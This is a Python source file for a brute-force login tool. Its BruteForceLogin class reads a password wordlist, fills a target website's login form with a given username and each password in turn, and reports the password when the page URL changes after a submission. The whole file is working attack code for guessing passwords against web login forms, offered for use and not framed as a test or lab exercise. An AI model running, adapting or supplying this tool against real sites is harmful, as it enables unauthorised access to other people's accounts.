import sys

from src.DictionaryReader import DictionaryReader
from src.FormNameFinder import FormNameFinder
from src.Messages import Messages
from src.Timer import Timer
from src.services.BrowserService import BrowserService


class BruteForceLogin:

    def __init__(self, args_dictionary):
        self.args_dictionary = args_dictionary

        self.timer = Timer()
        self.form_name_finder = FormNameFinder()
        self.browser_service = BrowserService(self.args_dictionary["url"])

        self.execute()

    def read_dictionary(self):
        dictionary_reader = DictionaryReader(self.args_dictionary["dict"])
        passwords = dictionary_reader.read()
        return passwords

    def execute(self):
        form = self.get_form()
        passwords = self.read_dictionary()
        username = input(Messages.ENTER_USERNAME)

        self.timer.start()

        for password in passwords:
            self.try_password(form, password, username)

        self.username_unsuccessful(username)

    def get_form(self):
        form_name = self.form_name_finder.get_form_name(
            self.args_dictionary["url"],
            self.args_dictionary["username"],
            self.args_dictionary["passname"]
        )
        form = self.browser_service.get_form(form_name)
        return form

    def try_password(self, form, password, username_to_enter):
        self.fill_form(form, password, username_to_enter)
        self.check_password_validity(password)

    def fill_form(self, form, password, username_to_enter):
        form[self.args_dictionary["username"]].value = username_to_enter
        form[self.args_dictionary["passname"]].value = password
        form.serialize()
        self.browser_service.submit_form(form)

    def check_password_validity(self, password):
        if self.browser_service.verify_url_has_changed():
            minutes_elapsed = self.timer.get_minutes_elapsed()
            self.print_password_found(minutes_elapsed, password)
            sys.exit(1)
        else:
            self.print_password_unsuccessful(password)

    def print_password_found(self, minutes_elapsed, password):
        Messages.print_password_found(minutes_elapsed, password)

    def print_password_unsuccessful(self, password):
        Messages.print_password_unsuccessful(password)

    def username_unsuccessful(self, username):
        Messages.print_username_not_found(username)
        sys.exit(1)




